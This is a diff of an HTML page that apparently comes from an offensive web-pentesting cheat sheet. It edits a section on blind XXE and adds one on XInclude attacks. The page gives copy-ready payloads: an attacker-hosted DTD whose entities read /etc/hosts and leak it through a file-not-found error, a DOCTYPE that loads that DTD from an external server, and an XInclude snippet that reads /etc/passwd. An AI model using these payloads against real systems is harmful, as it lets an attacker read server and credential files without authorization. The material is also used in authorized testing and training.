@@ -88,24 +88,25 @@ see if others paths provide more information.
 
 <b>NOTES:</b> 
 	
-- If the app is returning errors in regards XML parsing, technically that flaw can be abused to retrieve information. 
+- If the app is returning errors in regards XML parsing, technically that flaw can be abused to retrieve error messages. 
 - It helps to exfil multi-line information.
-- Sometimes it is required two entities, one to define the file to exfil and the second one to tyr to read and generate 
-the error. For that two functions are needed. <b>exfil</b> | <b>eval</b>
-- Out-of-band communications can help to discover this flaw.
+- Sometimes it is required two entities, one to define the file to exfil and the second one to try to read and generate the error. 
+For that two functions are needed. <b>exfil</b> | <b>eval</b>
+- Out-of-band communications can help to discover this flaw. That is why sometimes is needed to use an external exploit server to 
+host the exploit file. 
 
 <b>ATTACK SAMPLE:</b>
 
-As it is a blind technique, an external exploit server to host the entities is needed. This flaw can be triggered locally, 
-however, external interaction is required.
+As it is a blind technique, an external exploit server to host the entities is needed. This flaw can be triggered locally, however, 
+external interaction is required.
 
-::: >> EXPLOIT SERVER HOSTING ENTITIES
+<b>::: >> EXPLOIT SERVER HOSTING ENTITIES</b>
 
 <b>URL:</b> <b>https://URL/exploit</b>
 
-<b>ATTACK FILE:</b> exploit.html
+<b>_.STEP ONE: EXPLOIT FILE | CUMBIA.html</b>
 
-<mark hidden id="DOCFILE01">	
+<mark id="DOCFILE01">	
 &lt;!DOCTYPE html&gt;
 &lt;html&gt;
     &lt;head&gt;
@@ -114,8 +115,8 @@ however, external interaction is required.
     &lt;/head&gt;
     &lt;body&gt;
 	TEXT
-	&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
-	&lt;!ENTITY % eval "&lt;!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'&gt;"&gt;
+	&lt;!ENTITY % file SYSTEM "file:///etc/hosts"&gt;
+	&lt;!ENTITY % eval "&lt;!ENTITY &#x25; exfil SYSTEM 'file:///404FILE/%file;'&gt;"&gt;
 	%eval;
 	%exfil;
     &lt;/body&gt;
@@ -123,9 +124,38 @@ however, external interaction is required.
 </mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DOCFILE01')">.C0.</button>
-
 	
+<b id="ST02">ENTITY TO EXFIL:</b> &lt;!ENTITY % eval "&lt;!ENTITY &#x25; exfil SYSTEM 'file:///404FILE/%file;'&gt;"&gt;
+<b id="ST03">ENTITY TO GENERATE ERROR:</b> &lt;!ENTITY % eval "&lt;!ENTITY &#x25; error SYSTEM 'file:///404FILE/%file;'&gt;"&gt;
+	
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#ST02')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#ST03')">.C2.</button>
+	
+<b>_.STEP TWO: INSERT DTD</b>
+
+<mark id="ST01">&lt;!DOCTYPE attempt [&lt;!ENTITY % VAR_NAME SYSTEM "http://DTD-URL/CUMBIA.html"&gt; %VAR_NAME;]&gt;</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#ST01')">.C1.</button>
+
 </details>
+<details>
+<summary>EXPLOTE XInlcude</summary>
+<b>NOTES:</b>
+
+- Is a part of the XML specification that allows an XML document to be built from sub-documents.
+- No way to control the entire XML document and so we cannot define the DOCTYPE element. That's when XInclude works!
+- You can place an XInclude attack within any data value in an XML document. So any input field can work!
+- It need two references, one to the structure and the second to the content to retrieve.
+
+<b>SAMPLE:</b>
+
+<mark id="XXE10">&lt;NAME xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/NAME&gt;</mark>
+
+<b>xmlns</b>, means the body structure of the file. 
+<b>xi</b>, used to add attributes, <u>sample:</u> href, parsing, etc.	
+	
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#XXE10')">.C1.</button>
+	
+</details>	
 </div>
 </pre>
 <button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'">GO BACK</button>
